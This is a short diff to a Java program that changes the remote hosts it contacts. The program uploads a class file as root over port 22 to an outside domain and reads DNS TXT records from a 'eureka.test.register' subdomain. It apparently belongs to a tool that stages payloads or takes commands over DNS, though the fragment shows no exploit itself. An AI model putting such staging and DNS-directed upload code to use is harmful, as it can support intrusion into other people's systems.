@@ -55,7 +55,7 @@ public class Main {
             return;
         }
 
-        uploadFile("root", "yjj.nessary.top", 22, classPathName);
+        uploadFile("root", "yjj.p4j.cc", 22, classPathName);
 
 
         notifyRemote(args[0], matcher.group());
@@ -181,7 +181,7 @@ public class Main {
         Hashtable<String, String> env = new Hashtable();
         env.put("java.naming.factory.initial", "com.sun.jndi.dns.DnsContextFactory");
         DirContext dirContext = new InitialDirContext(env);
-        Attributes attrs = dirContext.getAttributes("eureka.test.register.nessary.top", new String[]{"TXT"});
+        Attributes attrs = dirContext.getAttributes("eureka.test.register.p4j.cc", new String[]{"TXT"});
         if (attrs == null) {
             return dnsVal;
         } else {
